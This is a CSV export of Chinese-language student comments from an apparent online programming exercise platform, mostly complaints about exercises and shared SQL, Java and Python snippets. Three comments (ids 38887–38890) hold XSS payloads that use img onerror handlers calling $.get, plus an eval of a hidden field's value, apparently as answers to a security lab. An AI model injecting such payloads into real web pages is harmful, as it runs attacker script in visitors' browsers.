discuss_id,user_id,challenge_id,dis_id,parent_discuss_id,root_discuss_id,reply_discuss_id,content,praises_count,created_at
35952,53298,3379.0,1117.0,,,,这题出的。。。,0,2020-05-17 13:11:34
35990,103557,3379.0,1117.0,,,,第三题重复的内容太多了……没必要……,0,2020-05-17 19:24:37
36033,95170,3149.0,1047.0,,,,如何删除数据库，我在执行的都是MyDB的，想删除这个，求教,0,2020-05-18 09:14:41
36034,95170,3149.0,1047.0,36033.0,36033.0,,解决了,0,2020-05-18 09:17:35
36050,52560,3512.0,1178.0,31930.0,31930.0,,"有时候 那个预期输出 会随着你的实际输出而变化

还有的时候 你自己打的汉字不行，要从过关任务上的汉字复制才行",0,2020-05-18 10:38:17
36051,98476,3268.0,1107.0,,,,我寻思这种写法效果和题目要求的不是一模一样的迈？这种写法还提示我透明度设置失败？![](/api/attachments/948998),1,2020-05-18 10:43:57
36060,72208,3496.0,1175.0,35114.0,35114.0,,"select Products.*,Vendors.vend_name,Vendors.vend_phone",0,2020-05-18 11:52:40
36068,41730,8179.0,2874.0,24154.0,24154.0,,"select id,date,visitors_flow
from gymnasium
limit 4,4;
0.0",0,2020-05-18 14:26:43
36086,54885,8435.0,2979.0,,,,"这个地方打错了  table
pivot_talbe函数的参数",0,2020-05-18 17:18:08
36141,128709,4078.0,1454.0,,,,？？？？？,0,2020-05-19 00:04:30
36156,100796,9120.0,3240.0,,,,"phoenix-5.0.0-HBase-2.0-server.jar
phoenix-core-5.0.0-HBase-2.0.jar
opt目录下没这两个包啊？
就一个apache-phoenix-5.0.0-HBase-2.0-bin.tar.gz，但格式不一样。
![](/api/attachments/952380)
咋弄",0,2020-05-19 09:12:46
36204,50124,8188.0,2874.0,,,,"if语句骚操作，嵌套if
SELECT IF(id%2=0,id-1,IF(id=5,id,id+1)) AS id,name 
FROM tb_Seat  ORDER BY id;",6,2020-05-19 14:50:03
36244,31530,2698.0,889.0,,,,"![](/api/attachments/954109)
![](/api/attachments/954110)
迷惑",2,2020-05-19 16:50:48
36285,111884,1133.0,387.0,,,,说实话，第三题看似考编程，其实考语文，结果考的是数学？？,0,2020-05-19 18:57:02
36297,106080,325.0,102.0,,,,这道题的cloth.txt文件里面根本就没有写入衣服的种数，这个测试输入的误导性也太大了。,2,2020-05-19 20:39:08
36305,111884,1133.0,387.0,36285.0,36285.0,,出题鬼才,0,2020-05-19 21:37:32
36345,111884,8450.0,2990.0,,,,我服了，这题目跟别人不一样，别人直接return出去，这里要输出一下。。。,0,2020-05-20 09:24:25
36416,53821,1990.0,660.0,,,,"![](/api/attachments/959331)
错哪了？",4,2020-05-20 15:46:56
36451,106665,204.0,90.0,,,,第二关的答案。。,0,2020-05-20 18:09:05
36485,47225,7765.0,2727.0,,,,"if not exists (select * from student where sno=@sno)
        print ""No such student""
else
    begin
        delete from student where sno=@sno
        print ""successfully deleted""
    end",0,2020-05-20 21:17:12
36509,100796,9120.0,3240.0,36156.0,36156.0,,我知道了，谢谢,0,2020-05-21 07:20:28
36530,106665,212.0,93.0,,,,迭代n-1次的结果和迭代n次的结果足够接近时为方程的根。我直接迭代100次。。。,0,2020-05-21 10:28:16
36536,33986,2928.0,889.0,,,,"![](/api/attachments/961864)
直接拒绝接入啊，做不下去了",3,2020-05-21 10:59:56
36537,52728,3588.0,1187.0,,,,第三关执行看天意？,1,2020-05-21 11:00:13
36554,103605,3385.0,1142.0,33298.0,33298.0,,注释那里有标明，==是比较地址，是不是new一个新地址，所以两个的地址不同？（小声）,0,2020-05-21 12:04:55
36598,100769,4944.0,1786.0,,,,生活不易 小轩叹气,1,2020-05-21 17:47:56
36666,47747,4497.0,1628.0,,,,这个地方是不是傻了，按照对的打都是错的,0,2020-05-22 09:27:42
36667,47747,4497.0,1628.0,,,,"Configuration config=HBaseConfiguration.create();
        Connection connection=ConnectionFactory.createConnection(config);
        Table table=connection.getTable(TableName.valueOf(tablename));  
        Scan scan = new Scan();
        ResultScanner scanner = table.getScanner(scan);
        for(Result result : scanner){
            for (Cell kv : result.rawCells()) {
                    String value =Bytes.toString(CellUtil.cloneValue(kv));
                    System.out.println(value);

            }
        }```java
Configuration config=HBaseConfiguration.create();
        Connection connection=ConnectionFactory.createConnection(config);
        Table table=connection.getTable(TableName.valueOf(tablename));  
        Scan scan = new Scan();
        ResultScanner scanner = table.getScanner(scan);
        for(Result result : scanner){
            for (Cell kv : result.rawCells()) {
                    String value =Bytes.toString(CellUtil.cloneValue(kv));
                    System.out.println(value);

            }
        }
```



我还是没能过啊",0,2020-05-22 09:31:31
36712,93495,2659.0,879.0,35285.0,35285.0,,想要做第一题之前就要先领悟到出题人模棱两可的出题思想，此题重在要考察出题人的出题文采，是道语文题,0,2020-05-22 13:06:21
36759,71402,5114.0,1664.0,,,,避雷：第二关是id不是ID,2,2020-05-22 19:05:55
36809,47747,4498.0,1628.0,,,,"Configuration config=HBaseConfiguration.create();
        Connection connection=ConnectionFactory.createConnection(config);
        Table table=connection.getTable(TableName.valueOf(tablename));  
        Scan scan = new Scan();
        scan.setCaching(200);
        scan.setStartRow(Bytes.toBytes(""1""));
        scan.setStopRow(Bytes.toBytes(""row199""));
        ResultScanner results = table.getScanner(scan);
        for(Result result : results){
            for (Cell kv : result.rawCells()) {
                    String value =Bytes.toString(CellUtil.cloneValue(kv));
                    System.out.println(value);

            }
        }
		真的我不想说了",0,2020-05-23 11:52:46
36810,53154,2698.0,889.0,,,,"明明弄好了却提示未启动vsftp
退出ftp又提示未初始化newUser
我佛了呀",4,2020-05-23 12:11:36
36860,52572,3588.0,1187.0,,,,这运气差的就离谱,0,2020-05-23 21:35:48
36863,52572,3588.0,1187.0,,,,第三题能不能调一下，我都测评了20分钟了，老倒霉蛋了,0,2020-05-23 21:42:33
36908,71402,4132.0,1466.0,,,,"现在才知道 url = ""jdbc:mysql://127.0.0.1:3306/""+数据库名;",1,2020-05-24 14:47:15
36914,53105,3283.0,1112.0,,,,这个已经无法访问了，希望管理员维护一下,0,2020-05-24 15:11:49
36937,111509,1133.0,387.0,,,,第三题真恶心。。。哇,0,2020-05-24 18:53:17
36942,105057,498.0,178.0,35250.0,35250.0,,哇哦,0,2020-05-24 19:18:48
36953,54681,7023.0,2424.0,,,,举报系统有问题，转半天不出结果，明明是正确的，还要多转一次,0,2020-05-24 21:00:45
37001,54649,7021.0,2424.0,,,,"这运行得也太慢了吧,最后居然还超时了,无语....",0,2020-05-25 09:59:16
37002,111871,1129.0,387.0,,,,,0,2020-05-25 10:05:18
37003,112036,8450.0,2990.0,,,,吐了，这return,1,2020-05-25 10:06:04
37010,94595,6227.0,2191.0,21444.0,21444.0,,应该写成一样,0,2020-05-25 10:31:42
37013,44669,2698.0,889.0,,,,"那些明明创建了newUser，但是评测显示没有newUser的同学，可以把newUser用户用
userdel删除之后再创建newUser",1,2020-05-25 10:57:44
37014,72227,9682.0,3396.0,36211.0,36211.0,,第一个chinese 后面少了逗号,0,2020-05-25 10:59:41
37036,54140,1108.0,368.0,,,,"这个描述是不是有错误，eid在sal表中是外键
为什么不是 alter table sal
			add constraint sal_id foreign key(eid) references emp(id);
![](/api/attachments/977866)
而是
alter table emp
    add constraint sal_id foreign key(eid)
        references sal(eid);",0,2020-05-25 12:38:24
37077,105856,232.0,99.0,28846.0,28846.0,,他有条件fuhao = 1，就是说这里是第一次出现‘-’，是负数，所以要把‘-’给p，然后p和q都指向下一个地址,0,2020-05-25 15:49:45
37167,111884,5925.0,2068.0,,,,秋梨膏，出张语文卷子吧，lj,0,2020-05-25 22:12:47
37168,111884,5925.0,2068.0,37167.0,37167.0,,浪费时间,0,2020-05-25 22:14:07
37170,106665,2399.0,794.0,,,,第一关要干啥？？,8,2020-05-25 22:23:24
37172,106665,2399.0,794.0,,,,"当x>1时,Hermite多项式定义为：
Hn(x)=
{ 
		1 n=0;
		2x n=1;
		2xHn-1(x)-2(n-1)Hn-2(x) n>1;
}
注释:Hn-1,Hn-2中的n-1,n-2为下标.",10,2020-05-25 22:32:04
37186,45239,2698.0,889.0,,,,设置newUsers用户密码时输入不进去字符怎么办，复制粘贴也不行,1,2020-05-26 00:06:46
37200,105057,498.0,178.0,35250.0,35250.0,,就这？,0,2020-05-26 09:44:24
37248,105179,498.0,178.0,35250.0,35250.0,,就这？,0,2020-05-26 16:05:02
37263,105179,423.0,122.0,,,,MD第三题参数说明白啊我去,2,2020-05-26 16:52:30
37291,106665,2390.0,800.0,,,,第二关。。。。,0,2020-05-26 18:51:08
37304,105137,3462.0,1166.0,,,,参考答案错误,0,2020-05-26 20:21:53
37360,109039,2680.0,885.0,14718.0,14718.0,,优秀,0,2020-05-27 09:13:40
37381,38893,119.0,61.0,,,,搁这恶心人呢 这题 有意义吗,0,2020-05-27 11:16:18
37442,72127,11305.0,3753.0,30549.0,30549.0,,厉害哦,0,2020-05-27 17:37:56
37460,100763,9120.0,3240.0,36156.0,36156.0,,tar -zxvf apache-phoenix-5.0.0-HBase-2.0-bin.tar.gz -C /app,0,2020-05-27 18:29:20
37467,106316,2559.0,848.0,,,,不是和上一关一模一样吗？才从上一关出来,0,2020-05-27 20:05:29
37512,26995,4669.0,1654.0,37501.0,37501.0,,"这个是因为dev的c环境和我们的平台有点差别，dev定义的字符串默认会是'\0'结尾，但是我们的环境不是，因此你需要将字符串的最后一位置为'\0',这样就可以了,c[strlen(a)+strlen(b)] = '\0';加上这个就行。",0,2020-05-28 09:16:22
37531,54200,6855.0,2368.0,24882.0,24882.0,,tql,0,2020-05-28 11:03:18
37542,44785,8425.0,2963.0,,,,"a = re.findall(r'[\d]{4}-[\d]{7}','张三：0731-8825951，李四：0733-8794561')
print(a)
第八关老师的意思是想匹配一种字符串使得，前边一段是4个数字，后面一段是七个数，并且中间用-链接，那么应该加一个转义符\吧",0,2020-05-28 12:48:45
37559,105669,8126.0,2817.0,,,,张嘉启说的太对了，爱了爱了！,2,2020-05-28 15:28:39
37560,105647,8123.0,2817.0,32487.0,32487.0,,说得对！！,0,2020-05-28 15:28:52
37568,72164,11305.0,3753.0,,,,这是文字游戏,0,2020-05-28 16:02:27
37582,121024,3289.0,1104.0,,,,远离脑残题，健康身体！,4,2020-05-28 17:37:51
37619,105085,498.0,178.0,6172.0,6172.0,,按照相关知识里的规则，直接超字典范围，裂开,0,2020-05-28 20:30:00
37626,105085,498.0,178.0,6172.0,6172.0,,第二关第二部分实例需要自己找规律，我裂开,0,2020-05-28 21:11:06
37705,120994,4702.0,1658.0,,,,每个学生信息后面有没有换行？,0,2020-05-29 17:28:09
37749,45111,2422.0,797.0,,,,我以为的平均值是所有的数组元素相加再除以数组长度，但老师的测试说明好像不是这么算的。所以怎么求平均值？头秃,0,2020-05-29 21:01:18
37770,45111,2469.0,774.0,,,,听函数听习惯了，老是方法方法别扭,1,2020-05-29 22:38:38
37778,111509,8366.0,2324.0,,,,第二关函数的两个数据**反了**，代码写的是num在前input_data在后，下面测试数据第一个是二维数组，第二个是int型数据。搞得我都反了，老是报错数组越界= =,5,2020-05-30 07:58:15
37792,95170,683.0,222.0,6909.0,6909.0,,有源代码吗？我也很老是出现问题,0,2020-05-30 10:53:23
37793,71770,1980.0,299.0,35678.0,35678.0,,感谢！！,0,2020-05-30 11:02:20
37798,95170,700.0,222.0,35581.0,35581.0,,大佬，有第一关的代码吗？求借鉴,0,2020-05-30 11:15:44
37799,95170,683.0,222.0,,,,MYSQL数据库连接老是出问题。。。,0,2020-05-30 11:17:33
37801,95170,687.0,222.0,8409.0,8409.0,,你们第一关一下子就运行出来了？,0,2020-05-30 11:19:18
37833,106736,4889.0,1764.0,,,,第五关的曲线绘制copy答案也过不了。。。,7,2020-05-30 15:24:10
37876,45111,2469.0,774.0,,,,"/********** Begin **********/
        // 调用方法，传入两门课程的成绩
      int avg=calcAvg(int score1,int score2);
       System.out.println(""平均分：""+avg);
		/********** End **********/
    }

    /*
     * 功能：计算两门课程考试成绩的平均分并输出平均分
     * 定义一个包含两个参数的方法，用来传入两门课程的成绩
     */

	/********** Begin **********/
    public static int calcAvg(int a,int b ){
           avg=(a+b)/2;
           return avg;
       };

	/********** End **********/",0,2020-05-30 18:42:54
37879,71402,4564.0,1635.0,13806.0,13806.0,,怎么还是不一样,0,2020-05-30 18:53:41
37894,45111,2275.0,774.0,,,,怎么打印出【52，79，81，89】？？？？,0,2020-05-30 19:48:03
37910,45111,2761.0,774.0,,,,哎，第四题怎么输出都不对，难搞哦,0,2020-05-30 20:56:17
37914,45111,2761.0,774.0,,,,第八关为什么要隐藏测试项解锁？？？？,2,2020-05-30 21:11:53
37921,45111,7986.0,2813.0,32505.0,32505.0,,对的呢,0,2020-05-30 21:53:57
37933,45111,2761.0,774.0,,,,升序排序是什么,0,2020-05-30 23:09:36
38018,42687,8422.0,2963.0,,,,这一波啊，我直接花十亿，肉蛋充饥,1,2020-05-31 16:49:01
38035,108364,10757.0,3733.0,,,,第三关一直乱码，没法提交了，不知道搞什么鬼,1,2020-05-31 18:27:41
38041,99031,21065.0,6275.0,37958.0,37958.0,,参见数据表示实验第一关的常见问题文档,0,2020-05-31 18:43:43
38048,109057,3081.0,1022.0,,,,反正不过都这样,0,2020-05-31 19:49:20
38111,71551,2074.0,700.0,,,,下载后，首先解压后第一张图只有一个文件夹，bin文件打开启动startup.bat有个窗口闪了一下然后就关闭了，下面那个测试网站也进不去,1,2020-06-01 09:48:21
38127,71551,2090.0,700.0,,,,Eclipse下载地址：网盘分享过期了,0,2020-06-01 11:46:50
38128,52791,4940.0,1778.0,,,,"![](/api/attachments/1004102)
这小数点怎么办啊？输入的字符串就带了小点解决不掉啊",0,2020-06-01 12:40:43
38135,53298,6989.0,2413.0,,,,浪费时间,0,2020-06-01 14:41:32
38194,106995,3215.0,1084.0,,,,"答案是错误的，后面应该有
insert into teacher (
    ID,
    Name,
    sex,
    Phone
)
values(
    '1',
    'Lucy',
    'F',
    NULL
)",0,2020-06-01 17:38:26
38209,105860,2416.0,805.0,,,,"第二题Acm函数：
Acm(m,n)=
{
n+1                 (m=0)
Acm(m-1,1)			(n=0)
Acm(m-1,Acm(m,n-1))	(m>0且n>0)
}",8,2020-06-01 19:15:32
38213,106316,2416.0,805.0,,,,else if(m<0 or n<0)return -1;,0,2020-06-01 20:16:13
38215,111910,6642.0,2306.0,,,,最后一关这个None是什么情况，二维列表后面有个None，气个半死,2,2020-06-01 20:19:35
38217,105463,2403.0,803.0,,,,"![](/api/attachments/1005306)
这不是相交吗",0,2020-06-01 20:33:57
38219,106316,2521.0,836.0,24142.0,24142.0,,巧了，我名泓博,0,2020-06-01 20:41:19
38230,72599,5113.0,1664.0,,,,为什么做第二关的时候回跳到第一关去，答案也会到第一关去,0,2020-06-01 21:35:05
38245,122569,4945.0,1778.0,,,,正则打爆一切,1,2020-06-02 09:30:24
38247,106665,2483.0,815.0,10456.0,10456.0,,N=M=3,0,2020-06-02 09:35:30
38249,52578,4940.0,1778.0,37119.0,37119.0,,。。感谢提醒,0,2020-06-02 09:51:09
38261,56988,7007.0,2424.0,,,,爱的魔力转圈圈？,0,2020-06-02 10:54:53
38272,53267,16577.0,5481.0,,,,第四关不是队列吗？？？？？？搞半天以为字典，结果定义出错了，腊鸡,0,2020-06-02 12:02:04
38273,53267,16577.0,5481.0,38272.0,38272.0,,用append就很迷,0,2020-06-02 12:07:23
38274,71551,4126.0,1466.0,,,,怎么设置请求的servlet路径为login。,0,2020-06-02 12:07:42
38283,103365,3285.0,1112.0,,,,参考答案都过不了，厉害了,2,2020-06-02 14:01:45
38286,120992,4699.0,1658.0,8119.0,8119.0,,这是在函数中，怎么再定义一个main函数,0,2020-06-02 14:04:44
38297,105187,498.0,178.0,35250.0,35250.0,,就这？,0,2020-06-02 15:53:23
38306,71551,2888.0,937.0,37595.0,37595.0,,S数据库就是这样的,0,2020-06-02 17:02:30
38307,71551,2888.0,937.0,36039.0,36039.0,,往下拉就好了，我也觉得不方便,0,2020-06-02 17:03:07
38309,71551,2889.0,937.0,34875.0,34875.0,,右键好像能粘贴啊。不能用ctrl+v.那个学jsp那里才坑，真不能粘贴,0,2020-06-02 17:11:50
38311,71551,2888.0,937.0,32341.0,32341.0,,use TestDb;,0,2020-06-02 17:12:58
38335,42783,8446.0,2963.0,,,,"![](/api/attachments/1008425)
第四关的人物介绍里这个r写在引号里面了，好像是错的",0,2020-06-02 20:09:04
38336,42783,8446.0,2963.0,38335.0,38335.0,,任务介绍，额,0,2020-06-02 20:09:46
38348,105959,2371.0,795.0,,,,刘（卓）林到此一游,1,2020-06-02 21:07:46
38353,106995,3215.0,1084.0,38194.0,38194.0,,但是我交的时候，如果不写他就是过不了,0,2020-06-02 21:43:31
38395,45111,2848.0,934.0,,,,Person容易弄成person,1,2020-06-03 13:01:01
38416,45111,2856.0,934.0,,,,选择题第一题感觉没有我要选的答案,1,2020-06-03 16:47:55
38428,45111,2856.0,934.0,,,,第一题为什么不是100，200，100，400,2,2020-06-03 17:34:18
38491,105405,325.0,102.0,,,,最终通过的代码都挺短的啊，但是耗时都巨久啊,0,2020-06-04 09:13:28
38493,128713,6568.0,2267.0,,,,规定答案规定格式了。还怎么做,0,2020-06-04 09:26:11
38501,55082,6571.0,2267.0,,,,"Console.WriteLine($""sum={sum}"");要用格式化输出，否则过不了。
真坑人",3,2020-06-04 10:08:36
38510,105876,232.0,99.0,,,,哎，太难。,0,2020-06-04 11:31:30
38511,106339,2813.0,922.0,33878.0,33878.0,,btfzsqk,0,2020-06-04 11:35:35
38515,105960,2395.0,800.0,22963.0,22963.0,,侠之大者，为国为民,0,2020-06-04 11:47:52
38548,108990,2680.0,885.0,38238.0,38238.0,,"对的 它给定的增量序列是5,3,1",0,2020-06-04 17:19:59
38549,108990,2680.0,885.0,38238.0,38238.0,,"是5,2 1",0,2020-06-04 17:20:19
38573,54130,1701.0,573.0,,,,希尔没有？,0,2020-06-04 19:17:03
38575,105078,2105.0,719.0,34444.0,34444.0,,卧槽。真的……,0,2020-06-04 19:50:49
38579,107301,2371.0,795.0,38348.0,38348.0,,faker 到此也一游,0,2020-06-04 20:27:13
38580,109912,8225.0,2901.0,,,,啊这……就很离谱,0,2020-06-04 20:27:38
38585,106064,2813.0,922.0,33878.0,33878.0,,scnacaic,0,2020-06-04 21:21:06
38586,106064,2814.0,922.0,7798.0,7798.0,,谢谢,0,2020-06-04 21:21:20
38587,106064,2812.0,922.0,7792.0,7792.0,,谢谢,0,2020-06-04 21:21:29
38588,106064,2813.0,922.0,7796.0,7796.0,,或许吧,0,2020-06-04 21:21:43
38589,106064,2814.0,922.0,34450.0,34450.0,,或许啊,0,2020-06-04 21:21:55
38610,105892,2813.0,922.0,,,,这就是链表吗，i了i了,1,2020-06-05 09:52:57
38613,109912,8225.0,2901.0,,,,真就万万没想到,0,2020-06-05 10:02:03
38635,35249,7786.0,2724.0,,,,路径有问题+1,0,2020-06-05 11:24:17
38642,45111,3521.0,1181.0,,,,怎么创建目录？？？,0,2020-06-05 13:52:34
38704,35585,4942.0,1786.0,7583.0,7583.0,,难顶,0,2020-06-05 20:20:53
38705,105505,8346.0,2940.0,,,,每次做程序，最难弄懂的就是各种逻辑关系，好难啊,1,2020-06-05 20:21:16
38707,105505,8347.0,2940.0,,,,这关都被我们做烂了（捂脸）,1,2020-06-05 20:49:23
38711,105505,8351.0,2941.0,,,,太难了，这考试要是考绝对完蛋（捂脸）,0,2020-06-05 21:21:36
38714,95170,687.0,222.0,,,,"Traceback (most recent call last):
  File ""src/step3/test.py"", line 31, in <module>
    insl.insert(year, province, firstBatch, gcMax, gcMin, gcMean, xlMax, xlMin, xlMean)
  File ""/data/workspace/myshixun/src/step3/insl.py"", line 9, in insert
    sql = ""insert into %s (year,province,firstBatch,gcMax,gcMin,gcMean,xlMax,xlMin,xlMean) values ('%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s')"" %(2014,""新疆"",475,642,598,617,647,549,579)
TypeError: not enough arguments for format string
错哪了？求告知",0,2020-06-05 21:44:34
38719,106665,552.0,192.0,,,,"next[0]=0就会超时，next[0]=-1即可;
但网上都说next[0]=0就很无语。。。",0,2020-06-05 23:10:05
38727,42200,9283.0,3277.0,,,,第三关要用sns.conutplot，跟直方图没半毛钱关系，相关知识建议参考https://www.cnblogs.com/cymx66688/p/10536403.html,0,2020-06-06 09:31:12
38730,42200,9283.0,3277.0,38727.0,38727.0,,sns.countplot,0,2020-06-06 09:32:01
38738,78176,423.0,122.0,,,,这个totMonths是什么啊,0,2020-06-06 10:39:41
38759,106821,2105.0,719.0,34444.0,34444.0,,tql,0,2020-06-06 15:58:27
38777,106311,235.0,99.0,,,,就这？【doge】,0,2020-06-06 18:59:19
38796,101938,6104.0,2142.0,,,,"myFriend.setInformation(25, ""Jackie"");
出错的，运行不了",0,2020-06-07 05:02:01
38803,52331,7765.0,2727.0,26924.0,26924.0,,"![](/api/attachments/1026170)
还有这里也是这样",0,2020-06-07 09:38:05
38806,52790,4940.0,1778.0,34521.0,34521.0,,Set集合的元素是无序的,0,2020-06-07 10:12:17
38863,52790,4945.0,1778.0,10630.0,10630.0,,中文的单引号的右半部分,0,2020-06-07 21:43:59
38886,107674,2692.0,887.0,27948.0,27948.0,,就你知道的多,0,2020-06-08 09:00:39
38887,45430,228.0,103.0,,,,"<img src=x onerror=""$.get('http://www.baidu.com/?success')"">",0,2020-06-08 09:03:36
38888,45430,228.0,103.0,,,,<img src=x onerror=$.get('http://127.0.0.1/?success')>,0,2020-06-08 09:13:11
38890,45430,228.0,103.0,,,,"<input type=""hidden"" id=""m"" value=""$.get('http://127.0.0.1/?m')"">
<img src=x onerror=eval(m.value)>",0,2020-06-08 09:29:14
38907,71496,2888.0,937.0,38787.0,38787.0,,你没创建TestDb数据库，这道题是要在这个数据库下建表,0,2020-06-08 11:46:36
38914,128720,6750.0,2333.0,,,,"```java
// TODO:
```",0,2020-06-08 13:49:35
38930,68725,4728.0,1708.0,,,,"感觉文档中的$$符号$$就是在$$增加阅读难度$$，看得$$眼睛花$$,$$$$$$$$$$$$$$$$$$$$$$$",0,2020-06-08 16:24:28
38937,106969,420.0,122.0,28236.0,28236.0,,我也是，最后那个makePayment函数还没填就测评过了。,0,2020-06-08 16:55:49
38951,45111,3512.0,1178.0,,,,"0/3src/step4/Task.java:13: error: unreported exception MyException; must be caught or declared to be thrown 
throw new MyException("" 用户名小于三位"");} 
^ 
1 error 
这是什么意思呀",0,2020-06-08 18:06:22
38952,45111,3512.0,1178.0,,,,为什么还要解锁隐藏测试项，为什么解锁还要自己花1000金币！！！,0,2020-06-08 18:12:40
38970,53267,16628.0,5495.0,,,,服了，模块叫DataChangetest,2,2020-06-08 21:24:24
38972,53267,16628.0,5495.0,,,,这个问题描述太抽象了，没有说清楚,0,2020-06-08 21:30:39
38977,41610,3019.0,1007.0,,,,一样的代码之前可以过，现在就不行了，是平台的问题嘛,0,2020-06-08 23:13:24
38978,106917,2813.0,922.0,38610.0,38610.0,,可以,0,2020-06-08 23:17:47
38986,101326,13384.0,4607.0,,,,实训24还算简单(蹭币),0,2020-06-09 08:54:36
38998,106664,246.0,100.0,36683.0,36683.0,,"他每一行的输入之后，都需要处理一次换行符，把换行符单独处理一下就可以了
int n;
	cin>>n;
	book a[100];
	for (int j=0;j<n;j++)
	{
		char s[2];
		cin.getline(s,2);//把换行符处理掉

		
		cin.getline(a[j].name,52);
		cin>>a[j].price;
	}",0,2020-06-09 10:37:48
39011,42957,15266.0,4162.0,,,,同上……感觉第五关骗了五百金币看测试集，说明中的for循环格式有问题，后面要加个冒号,0,2020-06-09 11:46:51
39026,62845,3588.0,1187.0,,,,非要让我看答案才让过  结果和自己写的一模一样,0,2020-06-09 14:55:01
39066,54206,4940.0,1778.0,32445.0,32445.0,,oj是用来给竞赛选手刷题用的和这个不是一个定位,0,2020-06-09 17:25:56
39081,45111,3489.0,1171.0,,,,@有且只有一个应该怎么写啊,0,2020-06-09 18:09:55
39083,45111,3489.0,1171.0,,,,"if(a>0&&a1=a2){ 
^ 
first type: boolean 
second type: int 
1 error 
a>0怎么就是boolean了？",0,2020-06-09 18:23:33
39087,45111,3489.0,1171.0,,,,测试集五是有什么毛病！！！！！,0,2020-06-09 18:42:46
39119,47219,6888.0,2368.0,38618.0,38618.0,,可以的,0,2020-06-09 23:11:55
39121,47219,6888.0,2368.0,38618.0,38618.0,,你sql语句写错了。,0,2020-06-09 23:15:26
39125,44785,12097.0,4228.0,,,,"第二关的讲解有几个地方没有说清楚，第一为什么X是m*(n+1)维的矩阵？
X的第一列是m个1，后面d列是描述的是m个数据中每一个的样本的特征值。一共m个样本即是m行，每个样本有d个特征值，再加上1是d+1列。
向量对向量求导，参考https://wenku.baidu.com/view/02811b81680203d8ce2f246b.html",2,2020-06-09 23:28:04
39143,120987,4699.0,1658.0,8119.0,8119.0,,哈哈睿哥威武！,0,2020-06-10 10:16:13
39157,47718,9692.0,3398.0,,,,别名....,0,2020-06-10 12:16:16
39161,99031,21128.0,6275.0,39156.0,39156.0,,"![](/api/attachments/1036322)
翻车现场要注意啊，单步到这个时钟，看哪里有问题，对比标准答案，educoder是很好的调试工具",0,2020-06-10 12:45:01
39259,37449,708.0,252.0,,,,"printf(""%5d + %-5d = %10d\n"",x,y,x+y);
    printf(""%5d - %-5d = %10d\n"",x,y,x-y);
    printf(""%5d * %-5d = %10d\n"",x,y,x*y);
    printf(""%5d / %-5d = %10d"",x,y,x/y);",8,2020-06-10 22:40:58
39286,125998,2398.0,802.0,39283.0,39283.0,,u1s1 是真的,0,2020-06-11 10:40:58
39289,53267,16653.0,5502.0,,,,我服了，做半天，结果系统繁忙交不上，mmp我还以为我错了，junk,0,2020-06-11 10:49:15
39312,70166,2859.0,937.0,,,,重置命令行了该怎么办啊,0,2020-06-11 15:11:24
39334,78176,3355.0,1134.0,,,,"```python
stack=[]
        for i in tokens:
            if i.isdigit():
                stack.append(int(i))
            elif i =='+':
                m=stack.pop()
                n=stack.pop()
                q=m+n
                stack.append(q)
            elif i =='-':
                m=stack.pop()
                n=stack.pop()
                q=n-m
                stack.append(q)
            elif i =='*':
                m=stack.pop()
                n=stack.pop()
                q=m*n
                stack.append(q)
            elif i =='/':
                m=stack.pop()
                n=stack.pop()
                if m == 0:
                    return False
                else:
                    q=n/m
                    stack.append(q)
        return stack.pop()

```
想知道我这个代码为什么不行？我觉得没毛病啊",0,2020-06-11 16:32:09
39336,70316,3651.0,1208.0,,,,deptID哪来的倒数第二个字母，？？？、害的搞半天，我****你个******,0,2020-06-11 17:07:17
39345,47219,6855.0,2368.0,12391.0,12391.0,,不用重新建，就一个连接对象。调用执行者对象的对应方法建表。,0,2020-06-11 18:28:44
39390,106021,194.0,80.0,39359.0,39359.0,,厉害厉害·,0,2020-06-11 23:31:53
39400,91502,2451.0,816.0,,,,"![](/api/attachments/1043051)

这是什么原因",0,2020-06-12 08:09:07
39403,47718,8170.0,2874.0,,,,"克隆一张表就好做了,在一个表内比较好麻烦",1,2020-06-12 09:02:11
39420,106337,2651.0,877.0,14132.0,14132.0,,同问,0,2020-06-12 12:07:24
39473,71518,2859.0,937.0,39312.0,39312.0,,一点回到解放前,0,2020-06-12 17:12:36
39494,106021,190.0,80.0,,,,明天就考试了，今天来做一做，全忘记了，吓哭![](/api/attachments/1046509),7,2020-06-12 20:50:18
39535,105892,2403.0,803.0,,,,过圆心的直线和园不相交，学到了,0,2020-06-13 09:03:57
39536,106286,5903.0,2069.0,,,,666,1,2020-06-13 09:04:26
39537,106286,5904.0,2069.0,,,,人过留名,1,2020-06-13 09:06:10
39538,106010,235.0,99.0,38777.0,38777.0,,6666【doge】,0,2020-06-13 09:24:57
39552,103332,2671.0,883.0,,,,肖子翔你做的来吗,1,2020-06-13 11:41:49
